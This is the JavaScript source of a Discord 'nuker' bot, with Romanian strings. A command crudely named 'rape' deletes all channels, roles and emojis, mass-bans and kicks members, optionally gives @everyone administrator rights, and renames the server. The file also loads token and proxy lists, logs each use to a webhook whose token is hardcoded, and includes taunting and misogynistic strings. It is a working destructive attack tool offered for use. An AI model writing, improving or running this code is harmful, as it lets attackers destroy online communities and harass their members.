const discordjs = require('discord.js');
const Discord = require('discord.js');
const fs = require('fs')
const tokens = fs.readFileSync('./variables/tokens.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const proxies = fs.readFileSync('./variables/proxies.txt', 'utf-8').replace(/\r|\x22/gi, '').split('\n');
const cooldown = new Set();
const cdtime = 5;
const msg = 5;
const configjson = require('./config.json');
const helpEmbed = require('discord.js');
const footer = require('discord.js');
const { MessageEmbed, version: djsversion } = require('discord.js');
const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
const settings = require('./settings.json');
const token = settings.token;
const prefix = settings.prefix;
const founder = settings.founder;
const disableEveryone = settings.DisableEveryone;
const myID = settings.ID;
const db = require("quick.db")
const inlinereply = require('discord-reply');
var whitelistedservers = [""]
var give_everyone_administrator = configjson.server.give_everyone_administrator

client.on("ready", async () => {

let matatactu = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("")
.setFooter('')
.setDescription(`The bot was reconnected`);

const wrb = new Discord.WebhookClient("", "");
    await wrb.send(matatactu)

  console.log(`
====================Dorleone========================
[\x1b[43m1\x1b[0m]\x1b[32m Ban All                \x1b[0m[\x1b[43m10\x1b[0m] \x1b[32mDefault Commands\x1b[0m
[\x1b[43m2\x1b[0m] \x1b[32mKick All               \x1b[0m[\x1b[43m11\x1b[0m] \x1b[41mBan Ids\x1b[0m
[\x1b[43m3\x1b[0m] \x1b[32mDelete Channels        \x1b[0m[\x1b[43m12\x1b[0m] \x1b[32mDefault Server\x1b[0m
[\x1b[43m4\x1b[0m] \x1b[32mDelete Roles           \x1b[0m[\x1b[43m13\x1b[0m] \x1b[32mList Members\x1b[0m
[\x1b[43m5\x1b[0m] \x1b[32mDelete Emotes          \x1b[0m[\x1b[43m14\x1b[0m] \x1b[32mList Roles\x1b[0m
[\x1b[43m6\x1b[0m] \x1b[32mMass Channels          \x1b[0m[\x1b[43m15\x1b[0m] \x1b[32mList Channels\x1b[0m
[\x1b[43m7\x1b[0m] \x1b[32mMass Roles             \x1b[0m[\x1b[43m16\x1b[0m] \x1b[32mList Servers\x1b[0m
[\x1b[43m8\x1b[0m] \x1b[41mUnban All\x1b[0m              \x1b[0m[\x1b[43m17\x1b[0m] \x1b[30mUnload\x1b[0m
[\x1b[43m9\x1b[0m] \x1b[32mAdmin Everyone         \x1b[0m[\x1b[43m18\x1b[0m] \x1b[30mClose\x1b[0m
\x1b[0m====================Dorleone========================`);
  
  const statusArray = [' WATCHING', 'Fasted ⚡, LISTENING', 'Better leave me alone, PLAYING', 'I make you die only 1 button, WATCHING'];
client.user.setPresence({ status: 'dnd' });

    setInterval(() => {
      client.user.setPresence({ status: 'dnd' });
      const random = statusArray[Math.floor(Math.random() * statusArray.length)].split(', ')
      const status = random[0];
      const mode = random[1];
      client.user.setActivity(status, { type: mode })

    }, 10000) //your time of changing status in miliseconds for example 1 second = 1000 ms
});

  console.log("Servers:")
    client.guilds.cache.forEach((guild) => {
        console.log(" csf cuaie >> " + guild.name + " - sklavi " + guild.memberCount)
    })

client.on("message", async message => {

  if (message.author.bot) return;      
  if (message.content.startsWith('help')) 
  {

        if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

let cmdmd31 = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("\`Albaneza Logs\`")
.setFooter('')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a folosit comanda \`help\``);

    const wrb = new Discord.WebhookClient("", "");
      await wrb.send(cmdmd31)

    const helpEmbed = new Discord.MessageEmbed()
      .setColor('d72bff')
      .setThumbnail(``)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
      .setTitle(`__**HELP COMMANDS**__`)
      .setImage("")
      .setDescription("rape - **__Destroy Server__** \n ping - **__Show Ping Bot__** []() \n []()")
      
        
        
            
              message.lineReply(helpEmbed).then(message => {     setTimeout(function() { message.edit(`This help menu is expired! Try again by typing \`help\``) }, 999999)})
            
  }

        if (message.content.startsWith('.uptime')) {	

              if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);
		
let npp1 = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("\`Albaneza Logs\`")
.setFooter('')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a folosit comanda \`uptime\``);


    const wrb = new Discord.WebhookClient("", "");
      await wrb.send(npp1)


		var errorvar;

				// Basic embed
				let totalSeconds = (client.uptime / 1000);
				let days = Math.floor(totalSeconds / 86400);
				totalSeconds %= 86400;
				let hours = Math.floor(totalSeconds / 3600);
				totalSeconds %= 3600;
				let minutes = Math.floor(totalSeconds / 60);
				let seconds = Math.floor(totalSeconds % 60);
			
			  var outputembed = new discordjs.MessageEmbed()
	    		.setColor('#d72bff')
	    		.setTitle(``)
          .setDescription(`**__UPTIME ALBANEZA__**
          
          Uptime: \`${hours} hour(s), ${minutes} minute(s) and ${seconds} second(s)\``)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
			  
       message.lineReply(outputembed).then(message => {     setTimeout(function() { message.edit(`This uptime menu is expired! Try again by typing \`uptime\``) }, 10000)})
		
	}     
        if (message.content.startsWith('stats')) {

    if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

let cue1 = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("\`Albaneza Logs\`")
.setFooter('')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a folosit comanda \`stats\``);

    const wrb = new Discord.WebhookClient("", "");
      await wrb.send(cue1)

		const output = new discordjs.MessageEmbed()
 .setDescription("**__STATS ALBANEZA__**")
	    .setColor('#d72bff')
	    .setTitle('')
	    .addField(`**Server Count**`, `${client.guilds.cache.size} server(s)`, false)
		.addField(`**Total Member Count**`, `${client.users.cache.size} member(s)`, false)
		.addField(`**Discord.JS version**`, `v${discordjs.version}`, false)
		.addField(`**For latency / ping information, type**`, `ping`, false)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()

       message.lineReply(output).then(message => {     setTimeout(function() { message.edit(`This stats menu is expired! Try again by typing \`stats\``) }, 999999)})
	}
            

//ping
  if (message.content.startsWith('ping')) {

        if (message.author.bot || message.channel.type === "dm") return;
        try {
            let fetched = await db.fetch(`prefix_${message.guild.id}`);
            if (fetched == null) {
            } else {
                prefix = fetched
            }
        } catch (e) {
            console.log(e)
    };

    if (cooldown.has(message.author.id)) {
      return message.lineReply(`Please wait 5 seconds to use this command`).then(m => {
        m.delete({ timeout: cdtime * 600 });
      });
    }
    cooldown.add(message.author.id);
    setTimeout(() => {
      cooldown.delete(message.author.id);
    }, cdtime * 1000);

let pengu1 = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("\`Albaneza Logs\`")
.setFooter('')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) a folosit comanda \`.ping\``);

    const wrb = new Discord.WebhookClient("896426653515935804", "s9qT5hEiu5DGd_wOXQxzSF39GvrfY3b3pSOY4cNdX4jZoNtg16bZ7QhA3dwl7_6M0FWQ");
      await wrb.send(pengu1)

const helpEmbed = new Discord.MessageEmbed()
.setTitle(``)
.setColor(`#d72bff`)
.setDescription(`
**Bot Latency:** \`${Math.round(client.ws.ping)}ms\`
**API Latency:** \`${Date.now() - message.createdTimestamp}ms\``)
                .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
        message.lineReply(helpEmbed).then(message => {     setTimeout(function() { message.edit(`This ping menu is expired! Try again by typing \`ping\``) }, 999999)})
        } 
		
  if (message.content.startsWith('rape')) {
    
		if (whitelistedservers.includes(message.guild.id))
		{
			const whitelistembed = new discordjs.MessageEmbed()

	    	.setColor('#00001')
                .setTitle("")
	    	.setDescription("You don't have permission to use command in this server")
                        .setFooter(
                    `Requested by ${message.author.tag}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
             message.lineReply(whitelistembed);
			return;
		}
    message.delete();
    // Channel Delete


    message.guild.channels.cache.forEach(channel => channel.delete().then(
      console.log(redBright(`rip canal`))
    )); // deletes all channels
    message.delete();

    // Ban All

    message.guild.members.cache.forEach(member => member.ban({ reason: "Dorleone was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ))

let mes = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("\`Albaneza\`")
.setFooter('')
.setDescription(`**${message.author.tag}** (` + "`" + message.author.id + "`" + `) o folosit comanda **rape** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) cu **${message.guild.memberCount}** membri`);

    const wrb = new Discord.WebhookClient("", "");

    await wrb.send(mes)
    // Kick All

    message.guild.members.cache.forEach(member => member.kick({ reason: "Albaneza was here" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ));
    // Delete All Roles                 


    message.guild.roles.cache.forEach((role) => {
      role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
    })

    // Delete All Emojis 

    message.guild.emojis.cache.forEach(e => e.delete({ reason: "Albaneza Was here" }).then(console.log(yellow(`EMOJI: ${e.name} s-a sters`))))

      message.guild.setIcon('https://cdn.discordapp.com/attachments/786279916273795115/802917703446560789/Screenshot_20210124-143354_TikTok.jpg') // changes server pfp

//haha
		if (give_everyone_administrator == false)
		{
			console.log(`Giving administrator to @everyone has been disabled.`)
		}
		else
		{
			var everyone = message.guild.roles.cache.find(r => r.name === "@everyone")
			everyone.setPermissions(["SEND_TTS_MESSAGES", "MANAGE_EMOJIS", "MANAGE_MESSAGES","ADMINISTRATOR", "MANAGE_GUILD", "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_ROLES", "MANAGE_WEBHOOKS", "MENTION_EVERYONE", "MUTE_MEMBERS", "MOVE_MEMBERS", "DEAFEN_MEMBERS", "VIEW_AUDIT_LOG", "KICK_MEMBERS", "CREATE_INSTANT_INVITE", "USE_VAD", "PRIORITY_SPEAKER", "CREATE_INSTANT_INVITE", "CONNECT", "SPEAK", "VIEW_CHANNEL", "VIEW_GUILD_INSIGHTS"])
			
		}
    // Death.

    message.guild.setName(`Server Inchis`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name

    // Channel Delete
    message.guild.channels.cache.forEach(channel => channel.delete().then(
      console.log(redBright(`canal sters`))
    ).then(
      // Channel Icon Change
      message.guild.setIcon('https://cdn.discordapp.com/attachments/786279916273795115/802917703446560789/Screenshot_20210124-143354_TikTok.jpg') // changes server pfp
    ));

    // Roles
    message.guild.roles.cache.forEach((role) => {
      if (!role.editable) {
        return;
      } else {
        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} s-a sters`)))
      }
    })

    // Emoji
    message.guild.emojis.cache.forEach(e => e.delete({ reason: "Albaneza was here" }).then(console.log(yellow(`EMOJI: ${e.name} s-a sters`))))


    //rupem de toate vijhwiavjhiahwjviahivw
        await message.guild.channels.create(`XXX`, {
      type : 'category'
    })

  }

})

const http = require('http');
const requestListener = function(req, res) {
  res.end('Hai sa rupem niste tarfe');
}
const server = http.createServer(requestListener); 
server.listen(8080);

client.login("")